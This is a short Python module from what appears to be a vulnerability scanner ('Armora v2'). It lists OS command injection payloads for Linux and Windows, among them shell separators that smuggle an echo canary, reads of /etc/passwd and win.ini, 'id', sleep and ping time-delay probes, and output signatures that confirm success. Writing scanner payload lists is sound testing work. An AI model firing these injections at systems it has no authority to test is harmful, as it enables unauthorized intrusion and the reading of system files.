"""
RCE (Remote Code Execution) Payloads — Armora v2.

OS command injection payloads for Linux and Windows.
Uses safe canary strings and time-delay techniques.
"""

RCE_CANARY = "armora_rce_9z"

RCE_PAYLOADS = [
    # Linux command separators
    f"; echo {RCE_CANARY}",
    f"| echo {RCE_CANARY}",
    f"|| echo {RCE_CANARY}",
    f"&& echo {RCE_CANARY}",
    f"`echo {RCE_CANARY}`",
    f"$(echo {RCE_CANARY})",
    f"; cat /etc/passwd",
    f"| cat /etc/passwd",
    f"; id",
    f"| id",
    # Windows command separators
    f"& echo {RCE_CANARY}",
    f"| echo {RCE_CANARY}",
    f"&& echo {RCE_CANARY}",
    f"; type C:\\windows\\win.ini",
    f"| type C:\\windows\\win.ini",
    # Newline injection
    f"%0aecho {RCE_CANARY}",
    f"%0d%0aecho {RCE_CANARY}",
]

# Time-based RCE payloads (expect ~5s delay)
RCE_TIME_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    "&& sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    # Windows
    "& ping -n 6 127.0.0.1",
    "| ping -n 6 127.0.0.1",
]

# Signatures confirming RCE
RCE_SUCCESS_SIGNATURES = [
    RCE_CANARY,
    "uid=",        # Linux `id` output
    "gid=",        # Linux `id` output
    "root:x:0:0",  # /etc/passwd
    "[fonts]",     # win.ini
    "[extensions]",
]
